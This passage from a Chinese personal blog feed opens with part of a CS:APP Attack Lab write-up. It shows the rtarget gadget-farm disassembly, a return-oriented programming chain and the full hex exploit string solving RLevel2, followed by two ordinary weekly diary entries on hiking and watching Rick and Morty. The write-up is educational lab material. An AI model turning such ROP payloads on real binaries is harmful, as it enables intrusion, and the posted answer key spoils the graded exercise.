class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">rtarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401999:c3                   retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:b8 fb 78 90 90       mov    $0x909078fb,%eax</span><br><span class="line">  40199f:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4019d5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:c7 07 99 d1 90 90    movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:8d 87 8d d1 20 db    lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:b8 89 d1 48 c0       mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:c7 07 81 d1 84 c0    movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:c7 07 88 c2 08 c9    movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:b8 48 89 e0 c1       mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:8d 87 89 c2 00 c9    lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:c7 07 81 ce 08 db    movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:8d 87 c8 89 e0 c3    lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:8d 87 48 89 e0 c7    lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:b8 99 d1 08 d2       mov    $0xd208d199,%eax</span><br><span class="line">  401a53:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:b8 89 c2 c4 c9       mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:c7 07 48 89 e0 91    movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:8d 87 89 ce 92 c3    lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:c7 07 89 d1 91 c3    movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:c7 07 81 c2 38 d2    movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:c7 07 09 ce 08 c9    movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:8d 87 08 89 e0 90    lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:8d 87 89 c2 c7 3c    lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:b8 88 ce 20 c0       mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:c7 07 48 89 e0 c2    movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:8d 87 89 c2 60 d2    lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:b8 8d ce 20 d2       mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401ab7:c3                   retq   </span><br><span class="line">  401ab8:90                   nop</span><br><span class="line">  401ab9:90                   nop</span><br><span class="line">  401aba:90                   nop</span><br><span class="line">  401abb:90                   nop</span><br><span class="line">  401abc:90                   nop</span><br><span class="line">  401abd:90                   nop</span><br><span class="line">  401abe:90                   nop</span><br><span class="line">  401abf:90                   nop</span><br></pre></td></tr></table></figure><p>题目还提供了部分汇编指令的对应的字节表示:</p><p><img src="../../Lab-Notes/img/Byte encoding of instructions.png" alt="byte coding"></p><h3 id="RLevel2"><a href="#RLevel2" class="headerlink" title="RLevel2"></a>RLevel2</h3><p>题目本身与Ctarget一致, 区别在于源代码编译的过程中使用了ASLR与禁止栈执行. 笔记中前缀 R 以示区分.</p><p>先来回顾一下我们在Level2中干了什么, 我们将代码注入了缓冲区, 并运行之, 从而使得cookie写入rdi寄存器. </p><p>在本题中, 我们选择先将 cookie 存入栈中, 然后使用 pop 指令将cookie推入$rdi 寄存器.</p><p>然而很遗憾, farm中并没有 <code>pop $rdi</code>对应的指令 5f , 倒是 <code>pop $rax</code> 对应的58指令频繁出现, 我们于是考虑迂回作战, 先将cookie推入rax, 再使用 <code>mov $rax,$rdi</code> 完成目标.</p><p>farm中有很多条路径可以实现上述目标, 我选择的是 <code>&lt;getval_280&gt;</code> 与 <code>&lt;setval_426&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq  </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019cc</span><br><span class="line">58 : pop $rax </span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019c5</span><br><span class="line">48 89 c7 : mov $rax,$rdi</span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>因此图解如下: </p><p><img src="../../Lab-Notes/img/Rtouch2_pic.png" alt="Rtouch2_pic"></p><p>答案为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>大功告成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell 输入</span><br><span class="line">.&#x2F;hex2raw &lt;in4.txt &gt; out4</span><br><span class="line">.&#x2F;rtarget -i out4 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell 输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2020年7月3日~7月8日. 完成了CS:APP 第三个配套实验 Attack Lab.</p><p>这个实验包括了大量的需要自学的内容, 涉及到内存中栈的管理, 函数跳转(retq)的方式, 缓冲区溢出错误, gets()等函数的缺陷等知识点. 了解并尝试了 代码注入攻击, 面向返回编程等代码攻击手段. 了解了 空间布局随机化, 栈禁止执行, 金丝雀区的设置 等代码防御方式.</p><p>提高了自学能力以及对 gdb 等调试工具的使用能力.</p><p>由于本实验最后一小题 RLevel3 本身并没有新知识点 但需要花费大量时间解题, 故暂时略去不做.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记&lt;/p&gt;
&lt;p&gt;攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.&lt;/p&gt;
&lt;p&gt;本文显式地包含答案, 如果你想自己解决,不建议使用本文.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;对应Github仓库 点我&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="乘龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/CSAPP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/tags/CSAPP/"/>
    
      <category term="Lab" scheme="http://yoursite.com/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202007-2</title>
    <link href="http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-2/"/>
    <id>http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-2/</id>
    <published>2020-07-24T12:25:02.000Z</published>
    <updated>2020-07-31T11:35:36.336Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月6日~2020年7月12日</p><p>徒步: 溧阳-丫髻山</p><a id="more"></a><h2 id="徒步-溧阳-丫髻山"><a href="#徒步-溧阳-丫髻山" class="headerlink" title="徒步: 溧阳-丫髻山"></a>徒步: 溧阳-丫髻山</h2><p>这周日 (7月11-12日) 第一次尝试徒步+爬野山. 以下为流水账记录:</p><p>因为集合的时间是周日大清早, 所以周六就提前去南京了, 找了一家普普通通的青旅安顿下来, 晚上在玄武湖公园逛了一圈 —— 预料之外的大啊哈哈哈, 晚上来这里跑步应该不错, 可惜还是在市中心, 空气不太行. 话说南京的早点包子真难吃啊… 早起去便利店安排了一些物资, 2L 的怡宝+1.5L 的绿茶, 后来证明买这些都是非常必要的.</p><p>领队是个很阳光的大兄弟, 很会唠. 等大巴的时候发现大家都是装备齐全, 背包+登山杖+徒步鞋, 只有我背个小破书包, 蹬了个平底运动鞋来了哈哈哈, 下次一定准备齐全😂. 大巴上领座是位带着两个双胞胎的大叔, 一看就是老户外达人了, 孩子约莫上初中, 一人一个登山杖. 一家人乐乐呵呵地来徒步, 又锻炼体质又促进感情, 真好啊🍋. </p><p>一个钟左右就到溧阳了. 目的地其实是溧阳, 句容交界的两座山头 (最后只爬了一座) . 本来的计划是野道去公路回, 结果前一天一直下雨, 就决定先走公路, 让山路多晒晒太阳. 说起来超级幸运, 本来都已经做好了下雨取消山路的心理准备了, 没想到早上突然晴天. 这也导致我没有带防晒(呜呜呜我以为会是阴天的脑子瓦特了), 带着防身又不多~ 一天走下来直接黑了两个度, 辛苦养半年,一朝回到解放前. </p><p>溧阳的一号彩虹公路, 其实只是中间的双黄道替换成三种不同颜色的标志线, 起初看图片觉得平平无奇, (不就是换个颜色吗有什么新鲜的) 实际上在公路走啊走啊, 看见一条彩虹从脚下延申向远方, 还是有种小确幸滴. 我甚至怀疑倘若自驾走这条路线都没有徒步来的快乐. 一路上和周围人谈笑风生. 有去时正好坐我后排的X, 主动来搭话的杰哥, 另一个小哥shè哥chù Y. 都是独行侠, 甚至都是互联网相关行业的, 只有我一个在校学生. 杰哥是老徒步者了,准备十分充分(连护袖都有准备) 我甚至被杰哥开玩笑”看鞋子就知道是不是新手徒步” (别骂了别骂了我回去就买鞋子😭) 一路上蓝天白云, 上半晌的柏油路还没有升温, 跟着大家东扯西扯: 杰哥今年才从Z大硕士毕业, X 在江宁工作一年, Y本科出来已经工作了五年了. 听他们谈论房租 未来发展, 人生规划. 在想过几年自己是不是也在某个城市漂泊, 在考虑户口, 房价, 股价, 政策发展与行业未来. 同行的还有一个背着女孩的父亲, 小女孩约莫四五岁, 坐在爸爸背后的座位上. 后面上坡下坡都是父亲一直背完了全程, 实在太厉害了!</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%BD%A9%E8%99%B9%E5%85%AC%E8%B7%AF.jpg" alt="彩虹公路"></p><p>终于走过了上半程, 在常州一处小监狱门口稍作休整, 和新伙伴们互相分享了干粮和水—— 这种徒步后的饥饿感让食物瞬间升华, 好吃程度不是拿个方格布带个小竹篮能比拟的2333. 发现拿头巾沾水后带着真的太爽了! 大太阳照着水分汽化吸热, 不经过汗流浃背体会不到凉爽的感觉. 就算在空调房里待一整个夏天也不行. 给大家分享了水, (内心OS: 终于把这个大累赘分出去了! ) 双胞胎在接过水后, 大叔还在一旁督促要说谢谢,  在野外水是非常非常重要的资源云云, 家教极好! 休整之后大家进入了野道, 我也开始记录爬山的路径. </p><p>第一小关是一座摇摇欲坠的小竹桥, 还未见到影子, 就听见前方队友惊呼, 原来竹桥年久失修, 终于在今日不堪重负垮了一半, 半截桥身已然入水. 后面的人只能一个一个走. 扒着相对牢固的扶手. 在最后一个人走过时, 竹桥终于完成了自己一生的使命, 光荣牺牲. 第二天大叔在群里发了我们每个人过桥的照片, 原来他一直在对岸拍摄大家互帮互助过桥的照片, 实在是太惊喜了.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%BF%87%E6%A1%A5.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E6%A1%A5.jpg" width = "800" height = "1000" /></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8A.jpg" width="800" height = "1200" /></p><p>接下来一段上坡路, 坡度大约三四十多度, 茂林修竹, 蚊虫四散. 有同行者带了小音箱, 歌声回绕. 过了这一小段竹林后便是稍显难走的林中小径, 不过半米宽度. 由于X是妹子, 体力不佳, 我们逐渐和脱离了大部队, 又等到了另外一位女生Z. 互相帮着背个包搭把手, 爬上了山顶. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%B1%B1%E9%A1%B6.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%88%E7%85%A7.jpg" alt="合照"></p><p>下山. </p><p>下山的路比我们想的要更加麻烦, 坡度更大, 沙土质地的路也更难走. 只能每次都踩着树根和石块落脚. 有几段路中间没有落脚点, 后一个人就踩着前一个人的脚作为落脚点, 我也才意识到平底鞋真的真的不适合爬山orz, 完全没有抓地力. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8B.jpg" width="800" height = "1800" /></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%AE%B0%E5%BD%95.jpg" alt=""></p><p>晚上约了快乐火锅</p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年7月6日~2020年7月12日&lt;/p&gt;
&lt;p&gt;徒步: 溧阳-丫髻山&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202007-3</title>
    <link href="http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-3/"/>
    <id>http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-3/</id>
    <published>2020-07-24T12:24:42.000Z</published>
    <updated>2020-07-24T13:18:50.671Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月13日~2020年7月19日</p><p>看番: 瑞克与莫蒂</p><p>回西安</p><a id="more"></a><h2 id="看番-瑞克与莫蒂"><a href="#看番-瑞克与莫蒂" class="headerlink" title="看番: 瑞克与莫蒂"></a>看番: 瑞克与莫蒂</h2><p>久闻大名的神番,终于在我爬山后的腰酸背痛的日子里看完了. 应该是第一次接触美漫 (也是第一次在A站看番) 果然比日漫亚撒西舒爽多了! </p><p>鬼才剧本, 每一集都对时代和社会的痛点进行尽情的诠释——无论是批判还是讽刺, 解构还是歌颂, 常常在一两句话中忽然get到编剧的意图, 然后一拍大腿妈的绝了. </p><p>配音太强了, 听说两个主角的配音都是一个人(这人还同时担任编剧) 我听过很多优秀的日本声优的出演, 能给角色赋予灵魂. 但还是有被这部惊到了: 瑞克与莫蒂的配音好像就是角色自己说出来的一样, 完全符合想象中的二人. </p><p>脑洞比较大. 相对与好莱坞式拿着激光武器突突突的废科幻作品, 本作的幻想程度很对我胃口. 天马行空又大致符合逻辑, 再夹杂着一点点不科学. 比如日了星球, 或者满眼蚂蚁先生. 纯粹的美国式的低俗无聊不遗余力的边角料的屎尿屁想象, 毫无意义,因此让人翱翔.</p><p>美国特色式的永远能在作品中影射现实. 哪怕是真·盒中盒这种老式科幻剧情都能整成奴隶制与博弈论. 多线并行又在结尾交会. 作品甚至能够同时影射资本主义的大部分社会问题 (没错我就是说的S3E7) 信息量最大，隐喻最多，故事最丰富立体，情节最波荡曲折. 没有人比我更懂民族矛盾 —— 其实都是阶级矛盾. </p><p>以及被广大A站网友津津乐道的第四面墙…其实我倒是觉得这个还好, 孤独的看透宇宙荒谬本质的天才科学家, 虽然悲壮却亦不少见. 更打动的则是瑞克认清宇宙的真相, 却依旧热爱生活.</p><p>附录: <a href="https://www.douban.com/group/topic/157799509/" target="_blank" rel="noopener">好看的相关壁纸与插画</a></p><h2 id="收拾东西回长安"><a href="#收拾东西回长安" class="headerlink" title="收拾东西回长安"></a>收拾东西回长安</h2><p>字面意思, 收拾收拾回学校咯</p><p>回去之前还顺便跟两位本地同学吃吃喝喝, 回民街的文文烧烤, 这个酱料真的很特色. 早上在建国路整了碗荤胡辣汤泡馍, 可以, 这很正宗.</p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>跟高中同学又起了联系, 逛了一下午, 快乐.</p><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><p>none</p><h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>复习</p><p>英语</p><p>研究宿舍厨艺</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年7月13日~2020年7月19日&lt;/p&gt;
&lt;p&gt;看番: 瑞克与莫蒂&lt;/p&gt;
&lt;p&gt;回西安&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光H_2020上半年</title>
    <link href="http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89H-2020%E4%B8%8A%E5%8D%8A%E5%B9%B4/"/>
    <id>http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89H-2020%E4%B8%8A%E5%8D%8A%E5%B9%B4/</id>
    <published>2020-07-06T12:57:25.000Z</published>
    <updated>2020-07-06T14:14:24.115Z</updated>
    
